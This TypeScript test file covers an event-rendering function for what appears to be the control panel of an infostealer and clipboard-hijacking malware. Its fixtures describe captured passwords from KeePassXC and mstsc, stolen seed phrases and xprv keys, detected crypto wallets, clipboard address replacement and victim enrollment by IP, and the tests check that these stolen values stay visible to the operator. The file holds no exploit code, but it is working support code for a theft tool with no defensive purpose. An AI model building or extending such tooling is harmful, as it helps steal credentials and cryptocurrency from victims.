import { test } from 'node:test';
import assert from 'node:assert/strict';
import { eventView } from '../src/lib/event-view';

const legacy = '  seed encontrada: 12 palabras\nabandon abandon about  ';

test('legacy is returned byte for byte and never trimmed', () => {
  const view = eventView({ kind: 'seed_found', data: { words: 12, value: 'abandon abandon about' }, legacy });
  assert.equal(view.legacy, legacy);
  assert.equal(view.legacy.startsWith('  '), true);
  assert.equal(view.legacy.endsWith('  '), true);
});

test('every contract kind keeps its data as labelled fields', () => {
  const cases: Array<[string, Record<string, unknown>, string[]]> = [
    ['wallet_detected', { name: 'Phantom', pid: 7, title: 'Phantom Wallet' }, ['Phantom', '7', 'Phantom Wallet']],
    ['wallet_closed', { pid: 7 }, ['7']],
    ['password', { process: 'KeePassXC.exe', title: 'KeePass', text: 's3cret' }, ['KeePassXC.exe', 'KeePass', 's3cret']],
    ['clipboard_secret', { kind: 'seed-12', value: 'abandon about', process: 'chrome.exe', title: 'Wallet', words: 12 }, ['seed-12', 'abandon about', 'chrome.exe', 'Wallet', '12']],
    ['clipboard_replace', { coin: 'btc', original: 'a', replacement: 'b' }, ['btc', 'a', 'b']],
    ['seed_found', { words: 24, value: 'one two' }, ['24', 'one two']],
    ['secret_found', { secret_kind: 'xprv', confident: false, value: 'xprvA' }, ['xprv', 'false', 'xprvA']]
  ];
  for (const [kind, data, expected] of cases) {
    const view = eventView({ kind, data, legacy: 'old line' });
    assert.equal(view.legacy, 'old line');
    const values = view.fields.map((field) => field.value);
    for (const value of expected) assert.ok(values.includes(value), `${kind} lost ${value}`);
  }
});

test('an empty legacy still renders a title and the structured value', () => {
  const view = eventView({ kind: 'password', data: { process: 'mstsc.exe', title: '', text: 'hunter2' } });
  assert.equal(view.legacy, '');
  assert.equal(view.title, 'Password captured');
  assert.ok(view.fields.some((field) => field.value === 'hunter2'));
});

test('unknown kinds and extra keys never disappear', () => {
  const known = eventView({ kind: 'wallet_detected', data: { name: 'Phantom', pid: 7, extra: 'kept' } });
  assert.ok(known.fields.some((field) => field.label === 'extra' && field.value === 'kept'));
  const view = eventView({ kind: 'enrolled', data: { ip: '10.0.0.1', note: 'kept' } });
  assert.equal(view.title, 'enrolled');
  assert.ok(view.fields.some((field) => field.value.includes('10.0.0.1')));
  assert.ok(view.fields.some((field) => field.value === 'kept'));
});

test('a missing event still yields a generic view', () => {
  const view = eventView(undefined);
  assert.equal(view.kind, 'unknown');
  assert.equal(view.legacy, '');
  assert.ok(view.fields.length > 0);
});

test('event data is not mutated', () => {
  const data = { name: 'Phantom', pid: 7, extra: { nested: true } };
  const before = JSON.stringify(data);
  eventView({ kind: 'wallet_detected', data, legacy });
  assert.equal(JSON.stringify(data), before);
});
